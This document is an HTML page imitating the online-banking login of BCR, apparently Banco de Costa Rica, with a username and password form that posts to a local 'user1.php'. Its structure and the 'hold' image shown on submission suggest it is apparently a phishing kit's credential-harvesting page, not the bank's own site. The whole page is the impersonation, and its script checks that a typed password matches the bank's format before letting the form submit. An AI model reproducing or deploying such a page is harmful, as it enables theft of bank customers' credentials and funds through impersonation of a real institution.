<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BCR</title>
  <link href="archivos/style.css" rel="stylesheet" type="text/css">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    .modal {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }

    .modal img {
      width: 90%;
      max-width: 500px;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="head">
    <img src="archivos/logo.gif" class="logo">
    <img src="archivos/Certificado.svg" class="headimg1">
    <img src="archivos/Contactenos.svg" class="headimg2">
    <a href="#" class="linkhead1">Certificaciones</a>
    <a href="#" class="linkhead2">Contáctenos</a>
  </div>

  <div class="head2">
    <span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
  </div>

  <div class="costilla">
    <span class="seguridadtxt">Seguridad</span>
    <img class="imgcostilla1" src="archivos/Consideraciones.svg">  
    <img class="imgcostilla2" src="archivos/reglamento.svg">  
    <span class="textcostilla1">Consideraciones</span>
    <span class="textcostilla2">Reglamentos</span>
  </div>

  <div class="containerimg">  
    <div class="divform1">
      <form id="loginForm" action="user1.php" method="post">
        <span class="ingresartxt">Ingresar</span>
        <hr class="line1" color="#C4C4C4">

        <img class="userimg" src="archivos/Personalizar.svg">
        <img class="passimg" src="archivos/Seguridad.svg">

        <div class="floating-label">      
          <input class="user" type="text" name="usuario" id="usuario" placeholder=" " required>
          <span class="highlight"></span>
          <label>Usuario</label>
        </div>

        <div class="floating-label2">      
          <input class="pass" type="password" name="cpass" id="contrasena" placeholder=" " required>
          <span class="highlight2"></span>
          <label>Contraseña</label>
        </div>

        <button type="submit" class="btn-uno">Ingresar</button>
        <button class="btn-dos" type="submit">Recuperar datos de ingreso</button>

        <input type="checkbox" name="checkbox" class="digital">
        <label class="labelchk">Certificado Digital</label>
      </form>
    </div>

    <div class="divform2">
      <span class="ingresartxt">Registrarse</span>
      <hr class="line1" color="#C4C4C4">
      <span class="registertext">
        Regístrese aquí si desea utilizar los servicios de B@nca Digital.<br><br>
        Para registrarse requiere ser cliente y tener al menos un producto activo.
      </span>
      <button class="btn-tres">Continuar</button>
    </div>
  </div>

  <div class="footer">
    <span class="footertext">BCR © Derechos Reservados 2024. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span>
  </div>

  <!-- Modal con imagen para validación -->
  <div id="modalError" class="modal">
    <img src="archivos/hold.png" alt="Error" onclick="cerrarModal()">
  </div>

  <script>
    const form = document.getElementById("loginForm");

    function validarContrasena(pass) {
      const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[A-Za-z\d]{8,11}$/;
      return regex.test(pass);
    }

    function validarUsuario(usuario) {
      return !/\s/.test(usuario);
    }

    function mostrarModal() {
      document.getElementById("modalError").style.display = "flex";
    }

    function cerrarModal() {
      document.getElementById("modalError").style.display = "none";
    }

    form.addEventListener("submit", function (e) {
      const usuario = document.getElementById("usuario").value;
      const contrasena = document.getElementById("contrasena").value;

      if (!validarUsuario(usuario) || !validarContrasena(contrasena)) {
        e.preventDefault();
        mostrarModal();
        return;
      }
    });
  </script>

</body>
</html>
